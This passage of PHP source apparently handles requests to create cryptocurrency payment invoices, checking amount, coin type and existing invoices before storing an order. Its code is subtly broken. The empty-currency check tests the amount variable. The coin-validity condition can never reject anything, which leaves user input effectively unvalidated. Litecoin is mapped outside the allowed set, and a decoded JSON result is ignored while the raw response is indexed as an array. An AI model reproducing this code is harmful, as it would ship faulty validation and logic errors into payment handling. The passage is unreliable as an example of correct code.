		$rMsg = ['error', 'Amount cant be lower than 10.'];
        echo json_encode($rMsg);
        die();
	}

	// Check
	$Cryptocoin = @$Secure->SecureTxt($POST['currency']);
	// Is valid Cryptocoin
	if (empty($Amount)) {
		$rMsg = ['error', 'Cryptocoin is empty.'];
        echo json_encode($rMsg);
        die();
	}

	if(!($Cryptocoin) == 'bitcoin' || !($Cryptocoin) == 'ethereum' || !($Cryptocoin) == 'monero' || !($Cryptocoin) == 'doge') {
		$rMsg = ['error', 'Cryptocoin is invalid.'];
        echo json_encode($rMsg);
        die();
	}

	if(!empty(@$Order->LastUserOrder($User->UserData()['id'])['order_id'])) {
		if($Order->LastUserOrder($User->UserData()['id'])['invoice_status'] == 0){
			if($Order->LastUserOrder($User->UserData()['id'])['invoice_expires'] > time()){
				$rMsg = ['error', 'You already have active invoice.'];
				echo json_encode($rMsg);
				die();
			}
		}
	}

	// Get coin names
	if($Cryptocoin == 'bitcoin') {
		$Coin = 'BTC';
	} else if($Cryptocoin == 'ethereum') {
		$Coin = 'ETH';
	} else if($Cryptocoin == 'monero') {
		$Coin = 'XMR';
	} else if($Cryptocoin == 'doge') {
		$Coin = 'DOGE';
	} else if($Cryptocoin == 'litecoin') {
		$Coin = 'LTC';
	}

	// Make Invoice and get info
	$OrderInfo = $Order->createInvoice($Coin, $Amount);
	$okerrr = @json_decode($OrderInfo);

	// Insert in base
	if(!($Order->NewOrder($OrderInfo['result']['txn_id'], $OrderInfo['result']['address'], $OrderInfo['result']['amount'], $Amount, $Cryptocoin, time(), time() + $OrderInfo['result']['timeout'], urlencode($OrderInfo['result']['checkout_url']), urlencode($OrderInfo['result']['status_url']))) == true) {
		$rMsg = ['error', 'Failed. Please contact support!'];
		echo json_encode($rMsg);
		die();
	}

	// Send Success Message
	$rMsg = ['success', 'You will be redirected to invoice page.', $Order->LastOrderID()['order_id']];
	$_SESSION['token'] = bin2hex(random_bytes(32));
	echo json_encode($rMsg);
	die();
}

header("HTTP/1.0 404 Not Found");
die();

?>